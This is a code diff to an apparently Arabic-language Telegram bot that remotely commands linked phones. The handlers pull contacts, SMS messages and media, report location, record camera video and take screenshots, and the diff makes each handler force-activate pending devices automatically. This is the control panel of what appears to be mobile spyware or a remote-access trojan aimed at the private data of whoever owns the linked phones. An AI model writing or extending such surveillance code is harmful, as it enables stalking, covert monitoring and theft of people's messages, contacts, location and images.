@@ -868,6 +868,9 @@ def force_activate_devices(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
     # الحصول على جميع الأجهزة
     devices = device_manager.get_user_devices(user_id)
     
@@ -924,6 +927,9 @@ def list_devices(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
     devices = device_manager.get_user_devices(user_id)
 
     if not devices:
@@ -953,10 +959,11 @@ def list_devices(message):
         devices_text += f"   الحالة: {status_text}\n"
         devices_text += f"   آخر ظهور: {last_seen_text}\n\n"
 
-    devices_text += "💡 **للتحكم في جهاز معين، استخدم الأوامر مع معرف الجهاز**"
-
+    devices_text += "💡 للتحكم في جهاز معين، استخدم الأوامر مع معرف الجهاز"
+    
     bot.reply_to(message, devices_text, parse_mode='Markdown')
-    device_manager.log_activity(user_id, 'list_devices')
+    device_manager.log_activity(user_id, 'list_devices', f'count: {len(devices)}')
+
 
 @bot.message_handler(commands=['contacts'])
 def backup_contacts(message):
@@ -975,43 +982,43 @@ def backup_contacts(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
-    # الحصول على جميع الأجهزة (نشطة ومعلقة)
-    devices = device_manager.get_user_devices(user_id)
-    
-    if not devices:
-        bot.reply_to(message, "📱 ليس لديك أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
-        return
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
 
-    # البحث عن جهاز نشط أولاً، ثم جهاز معلق
+    devices = device_manager.get_user_devices(user_id)
     active_devices = [d for d in devices if d[1] == 'active']
     pending_devices = [d for d in devices if d[1] == 'pending']
-    
-    if active_devices:
-        device_id = active_devices[0][0]
-        device_status = "نشط"
-    elif pending_devices:
-        # تفعيل الجهاز المعلق تلقائياً
-        device_id = pending_devices[0][0]
-        device_manager.update_device_status(device_id, 'active', 'Auto-activated')
-        device_status = "تم تفعيله تلقائياً"
-    else:
-        bot.reply_to(message, "❌ لا توجد أجهزة متاحة للاستخدام.")
+
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
         return
 
-    # حفظ الأمر
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
     command_id = device_manager.save_command(user_id, device_id, 'backup_contacts')
 
-    # إرسال الأمر للجهاز
     result = command_executor.send_command(device_id, 'backup_contacts')
 
     if 'error' in result:
         bot.reply_to(message, f"❌ خطأ: {result['error']}")
         device_manager.update_command_result(command_id, 'failed', result['error'])
     else:
-        bot.reply_to(message, "📞 جاري نسخ جهات الاتصال...\nسيتم إرسال الملف عند الانتهاء.")
+        bot.reply_to(message, f"📞 جاري نسخ جهات الاتصال...\nالجهاز: {device_id} ({status})")
         device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'backup_contacts', f'device_id: {device_id}')
+
 
 @bot.message_handler(commands=['sms'])
 def backup_sms(message):
@@ -1030,14 +1037,30 @@ def backup_sms(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
     devices = device_manager.get_user_devices(user_id)
     active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
 
-    if not active_devices:
-        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
         return
 
-    device_id = active_devices[0][0]
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
     command_id = device_manager.save_command(user_id, device_id, 'backup_sms')
 
     result = command_executor.send_command(device_id, 'backup_sms')
@@ -1046,10 +1069,11 @@ def backup_sms(message):
         bot.reply_to(message, f"❌ خطأ: {result['error']}")
         device_manager.update_command_result(command_id, 'failed', result['error'])
     else:
-        bot.reply_to(message, "💬 جاري نسخ الرسائل النصية...\nسيتم إرسال الملف عند الانتهاء.")
+        bot.reply_to(message, f"💬 جاري نسخ الرسائل النصية...\nالجهاز: {device_id} ({status})")
         device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'backup_sms', f'device_id: {device_id}')
+
 
 @bot.message_handler(commands=['media'])
 def backup_media(message):
@@ -1068,11 +1092,29 @@ def backup_media(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
-    device_id, status = get_available_device(user_id)
-    
-    if not device_id:
-        bot.reply_to(message, f"❌ {status}.\nاستخدم `/link` لربط جهاز جديد.")
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
+    devices = device_manager.get_user_devices(user_id)
+    active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
+
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
         return
+
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
 
     command_id = device_manager.save_command(user_id, device_id, 'backup_media')
 
@@ -1086,6 +1128,7 @@ def backup_media(message):
         device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'backup_media', f'device_id: {device_id}')
+
 
 @bot.message_handler(commands=['location'])
 def get_location(message):
@@ -1104,14 +1147,30 @@ def get_location(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
     devices = device_manager.get_user_devices(user_id)
     active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
 
-    if not active_devices:
-        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
         return
 
-    device_id = active_devices[0][0]
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
     command_id = device_manager.save_command(user_id, device_id, 'get_location')
 
     result = command_executor.send_command(device_id, 'get_location')
@@ -1120,10 +1179,11 @@ def get_location(message):
         bot.reply_to(message, f"❌ خطأ: {result['error']}")
         device_manager.update_command_result(command_id, 'failed', result['error'])
     else:
-        bot.reply_to(message, "📍 جاري الحصول على الموقع...")
+        bot.reply_to(message, f"📍 جاري الحصول على الموقع...\nالجهاز: {device_id} ({status})")
         device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'get_location', f'device_id: {device_id}')
+
 
 @bot.message_handler(commands=['record'])
 def record_camera(message):
@@ -1142,14 +1202,30 @@ def record_camera(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
     devices = device_manager.get_user_devices(user_id)
     active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
 
-    if not active_devices:
-        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
         return
 
-    device_id = active_devices[0][0]
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
     command_id = device_manager.save_command(user_id, device_id, 'record_camera')
 
     # إرسال أمر التسجيل لمدة 30 ثانية
@@ -1163,6 +1239,7 @@ def record_camera(message):
         device_manager.update_command_result(command_id, 'sent')
 
     device_manager.log_activity(user_id, 'record_camera', f'device_id: {device_id}')
+
 
 @bot.message_handler(commands=['screenshot'])
 def take_screenshot(message):
@@ -1181,14 +1258,30 @@ def take_screenshot(message):
         bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
         return
 
+    # محاولة استيراد الأجهزة من الواجهة أولاً
+    import_devices_from_web_interface(user_id)
+
     devices = device_manager.get_user_devices(user_id)
     active_devices = [d for d in devices if d[1] == 'active']
+    pending_devices = [d for d in devices if d[1] == 'pending']
 
-    if not active_devices:
-        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
+    if not active_devices and not pending_devices:
+        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
         return
 
-    device_id = active_devices[0][0]
+    # استخدام جهاز نشط أو تفعيل جهاز معلق
+    if active_devices:
+        device_id = active_devices[0][0]
+        status = "نشط"
+    else:
+        device_id = pending_devices[0][0]
+        # تفعيل الجهاز المعلق
+        if force_device_activation(device_id):
+            status = "تم تفعيله"
+        else:
+            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
+            return
+
     command_id = device_manager.save_command(user_id, device_id, 'take_screenshot')
 
     result = command_executor.send_command(device_id, 'take_screenshot')
